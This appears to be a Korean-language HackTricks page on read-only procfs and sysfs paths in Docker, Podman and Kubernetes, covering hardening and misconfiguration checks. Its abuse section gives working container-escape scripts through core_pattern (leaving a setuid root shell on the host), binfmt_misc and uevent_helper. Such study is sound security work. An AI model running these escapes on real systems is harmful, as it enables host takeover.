# 읽기 전용 시스템 경로

{{#include ../../../../banners/hacktricks-training.md}}

읽기 전용 시스템 경로는 masked paths와 별개의 보호 기능입니다. 경로를 완전히 숨기는 대신 runtime이 해당 경로를 노출하되 읽기 전용으로 mount합니다. 이는 읽기 접근은 허용해도 되거나 운영상 필요할 수 있지만, 쓰기 작업은 매우 위험한 일부 procfs 및 sysfs 위치에 일반적으로 적용됩니다.

목적은 간단합니다. 많은 kernel interface는 쓰기가 가능해지면 훨씬 더 위험해집니다. 읽기 전용 mount는 모든 reconnaissance 가치를 제거하지는 않지만, compromise된 workload가 해당 경로를 통해 기본 kernel-facing 파일을 수정하는 것을 방지합니다.

## Operation

runtime은 proc/sys view의 일부를 읽기 전용으로 지정하는 경우가 많습니다. runtime과 host에 따라 다음과 같은 경로가 포함될 수 있습니다.

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

실제 목록은 다를 수 있지만, 모델은 동일합니다. 필요한 경우 visibility를 허용하고, 기본적으로 mutation을 거부합니다.

## Lab

Docker가 선언한 읽기 전용 경로 목록을 확인합니다:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
컨테이너 내부에서 마운트된 proc/sys 뷰를 검사합니다:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Security Impact

Read-only system paths는 host에 영향을 미치는 광범위한 abuse를 제한합니다. attacker가 procfs 또는 sysfs를 조회할 수 있더라도, 해당 경로에 write할 수 없으면 kernel tunables, crash handlers, module-loading helpers 또는 기타 control interfaces와 관련된 여러 직접적인 modification 경로가 제거됩니다. exposure가 사라지는 것은 아니지만, information disclosure에서 host influence로 이어지는 전환은 더 어려워집니다.

## Misconfigurations

주요 실수는 민감한 경로의 mask를 해제하거나 read-write로 remount하는 것, writable bind mounts를 사용해 host의 proc/sys content를 직접 노출하는 것, 또는 더 안전한 runtime defaults를 사실상 우회하는 privileged modes를 사용하는 것입니다. Kubernetes에서는 `procMount: Unmasked`와 privileged workloads가 더 약한 proc protection과 함께 사용되는 경우가 많습니다. 또 다른 일반적인 operational mistake는 runtime이 보통 이러한 경로를 read-only로 mount하므로 모든 workloads가 여전히 해당 default를 상속한다고 가정하는 것입니다.

## Abuse

protection이 약하다면, 먼저 writable proc/sys entries를 찾아보십시오:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
쓰기 가능한 항목이 있는 경우, 후속 조사가치가 높은 경로는 다음과 같습니다:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
이 명령어로 확인할 수 있는 내용:

- `/proc/sys` 아래의 writable 항목은 단순히 inspect할 수 있다는 의미를 넘어, container가 host kernel 동작을 수정할 수 있음을 의미하는 경우가 많습니다.
- `core_pattern`은 특히 중요합니다. writable한 host-facing 값은 pipe handler를 설정한 후 process를 crash시켜 host code-execution path로 전환할 수 있습니다.
- `modprobe`는 module-loading 관련 flow에서 kernel이 사용하는 helper를 보여줍니다. writable한 경우 전형적인 high-value target입니다.
- `binfmt_misc`는 custom interpreter registration이 가능한지 알려줍니다. registration이 writable하면 단순한 정보 leak가 아니라 execution primitive가 될 수 있습니다.
- `panic_on_oom`은 host 전체에 적용되는 kernel 결정을 제어하므로, resource exhaustion을 host denial of service로 전환할 수 있습니다.
- `uevent_helper`는 writable한 sysfs helper path가 host-context execution을 유발하는 가장 명확한 사례 중 하나입니다.

흥미로운 findings에는 원래 read-only여야 하는 writable한 host-facing proc knob 또는 sysfs entry가 포함됩니다. 이 시점에서 workload는 제한된 container view를 벗어나 meaningful한 kernel influence가 가능한 상태로 이동합니다.

### Full Example: `core_pattern` Host Escape

container 내부에서 `/proc/sys/kernel/core_pattern`이 writable하고 host kernel view를 가리킨다면, crash 이후 payload를 실행하도록 악용할 수 있습니다:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
호스트 kernel에 실제로 도달하는 path라면 payload가 호스트에서 실행되고 setuid shell을 남깁니다.

### 전체 예제: `binfmt_misc` Registration

`/proc/sys/fs/binfmt_misc/register`가 writable하다면, custom interpreter registration을 통해 일치하는 file이 실행될 때 code execution이 발생할 수 있습니다:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
호스트에 노출된 쓰기 가능한 `binfmt_misc`에서는 커널이 트리거한 interpreter 경로에서 code execution이 발생합니다.

### 전체 예시: `uevent_helper`

`/sys/kernel/uevent_helper`가 쓰기 가능하면, 일치하는 event가 트리거될 때 커널이 호스트 경로의 helper를 호출할 수 있습니다:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
이것이 매우 위험한 이유는 helper 경로가 안전한 container 전용 컨텍스트가 아니라 host filesystem 관점에서 확인되기 때문입니다.

## 점검

이러한 점검은 procfs/sysfs 노출이 예상대로 read-only인지, 그리고 workload가 여전히 민감한 kernel 인터페이스를 수정할 수 있는지를 확인합니다.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
여기서 중요한 점:

- 일반적인 hardened workload는 writable proc/sys 항목을 거의 노출하지 않아야 합니다.
- writable `/proc/sys` paths는 일반적인 read access보다 더 중요한 경우가 많습니다.
- Runtime이 path를 read-only라고 표시하지만 실제로 writable한 경우 mount propagation, bind mounts, privilege settings를 주의 깊게 검토해야 합니다.

## Runtime 기본값

| Runtime / platform | 기본 상태 | 기본 동작 | 일반적인 수동 완화 |
| --- | --- | --- | --- |
| Docker Engine | 기본적으로 활성화됨 | Docker는 민감한 proc 항목에 대한 기본 read-only path list를 정의함 | host proc/sys mounts 노출, `--privileged` |
| Podman | 기본적으로 활성화됨 | Podman은 명시적으로 완화하지 않는 한 기본 read-only paths를 적용함 | `--security-opt unmask=ALL`, 광범위한 host mounts, `--privileged` |
| Kubernetes | Runtime 기본값 상속 | Pod settings 또는 host mounts로 완화되지 않는 한 underlying runtime read-only path model을 사용함 | `procMount: Unmasked`, privileged workloads, writable host proc/sys mounts |
| containerd / CRI-O under Kubernetes | Runtime 기본값 | 일반적으로 OCI/runtime defaults에 의존함 | Kubernetes 행과 동일함. 직접적인 runtime config 변경으로 동작이 약화될 수 있음 |

핵심은 read-only system paths가 일반적으로 Runtime 기본값으로 설정되지만, privileged modes 또는 host bind mounts를 사용하면 쉽게 무력화할 수 있다는 점입니다.
{{#include ../../../../banners/hacktricks-training.md}}
